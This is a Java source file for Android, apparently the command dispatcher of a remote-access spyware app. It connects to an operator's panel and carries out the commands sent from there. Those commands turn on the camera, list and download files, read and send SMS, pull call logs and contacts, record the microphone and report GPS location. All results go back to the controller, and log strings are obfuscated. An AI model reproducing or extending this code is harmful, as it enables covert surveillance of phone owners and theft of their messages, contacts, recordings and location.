package com.piupiupiu;

import android.content.Context;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;


public class Dispatcher {

    private static final String TAG = StrCodec.dec("Ez9TEA==");

    public static Context context;

    private static final FileManager fm = new FileManager();

    /** 连续启动失败的重试上限，超过即放弃，避免无限递归。 */
    private static final int MAX_RETRY = 3;

    public static void startAsync(Context con) {
        context = con;
        int retry = 0;
        while (retry < MAX_RETRY) {
            try {
                sendReq();
                return;
            } catch (Exception ex) {
                retry++;
                Log.e(TAG, StrCodec.dec("AyRAB01LQFNDNhQoQRQXNwQiWFU=") + retry + "/" + MAX_RETRY);
            }
        }
    }

    public static void sendReq() {
        LinkManager link = LinkManager.getInstance();

        link.setHandler(new LinkManager.FrameHandler() {
            @Override
            public void onFrame(String type, JSONObject payload) {
                try {
                    handle(type, payload);
                } catch (Throwable e) {
                    // 用 Throwable：Error（如 OOM）也要回传，且绝不让它打死轮询线程
                    Log.e(TAG, StrCodec.dec("FDlSBVgfRVoKPwM+AkY="), e);
                    reportError(type, e);
                }
            }
        });

        link.connect();
    }

    /**
     * 失败回传：把命令执行异常发回面板（载荷 {"error":"<异常类名>: <消息>"}），
     * 面板各视图会把它显示成 "xxx failed: ..."，不再出现“点了没反应、原因看不到”。
     * 异常来自平台 API（SecurityException 等）时类名不被混淆，对使用方可读。
     */
    public static void reportError(String type, Throwable e) {
        try {
            String msg = e.getClass().getSimpleName();
            String detail = e.getMessage();
            if (detail != null && detail.length() > 0) {
                msg = msg + ": " + detail;
            }
            JSONObject err = new JSONObject();
            err.put("error", msg);
            LinkManager.getInstance().send(type, err);
        } catch (Throwable t) {
            Log.e(TAG, StrCodec.dec("AjVRGksfBlRLMx0pCQ=="), t);
        }
    }

    private static void handle(String order, JSONObject data) throws Exception {
        if (Protocol.CAMERA.equals(order)) {
            String extra = data.getString(AppConfig.FIELD_EXTRA);
            if (AppConfig.EXTRA_CAM_LIST.equals(extra)) {
                camera(-1);
            } else if ("1".equals(extra)) {
                camera(1);
            } else if ("0".equals(extra)) {
                camera(0);
            }
        } else if (Protocol.FILES.equals(order)) {
            String extra = data.getString(AppConfig.FIELD_EXTRA);
            if (AppConfig.EXTRA_LS.equals(extra)) {
                files(0, data.getString(AppConfig.FIELD_PATH));
            } else if (AppConfig.EXTRA_DL.equals(extra)) {
                files(1, data.getString(AppConfig.FIELD_PATH));
            }
        } else if (Protocol.SMS.equals(order)) {
            String extra = data.getString(AppConfig.FIELD_EXTRA);
            if (AppConfig.EXTRA_LS.equals(extra)) {
                sms(0, null, null);
            } else if (AppConfig.EXTRA_SEND_SMS.equals(extra)) {
                sms(1, data.getString(AppConfig.FIELD_TO), data.getString(AppConfig.FIELD_SMS));
            }
        } else if (Protocol.CALLS.equals(order)) {
            calls();
        } else if (Protocol.CONTACTS.equals(order)) {
            contacts();
        } else if (Protocol.MIC.equals(order)) {
            mic(data.getInt(AppConfig.FIELD_SEC));
        } else if (Protocol.LOCATION.equals(order)) {
            location();
        }
    }

    // ---------------- 各能力入口 ----------------

    public static void camera(int req) {
        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null) {
                LinkManager.getInstance().send(Protocol.CAMERA, cameraList);
            }
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

    public static void files(int req, String path) {
        if (req == 0) {
            LinkManager.getInstance().send(Protocol.FILES, fm.walk(path));
        } else if (req == 1) {
            fm.downloadFile(path);
        }
    }

    public static void sms(int req, String phoneNo, String msg) throws Exception {
        if (req == 0) {
            LinkManager.getInstance().send(Protocol.SMS, SMSManager.getSMSList());
        } else if (req == 1) {
            // relayMessage 失败时直接抛异常 -> 由 reportError 把具体原因（如缺 SEND_SMS 权限）发回面板
            boolean isSent = SMSManager.relayMessage(phoneNo, msg);
            LinkManager.getInstance().send(Protocol.SMS, isSent);
        }
    }

    public static void calls() {
        LinkManager.getInstance().send(Protocol.CALLS, CallsManager.getCallsLogs());
    }

    public static void contacts() {
        LinkManager.getInstance().send(Protocol.CONTACTS, ContactsManager.getContacts());
    }

    public static void mic(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void location() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();

        if (gps.canGetLocation()) {
            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
        } else {
            location.put("enable", false);
        }

        LinkManager.getInstance().send(Protocol.LOCATION, location);
    }
}
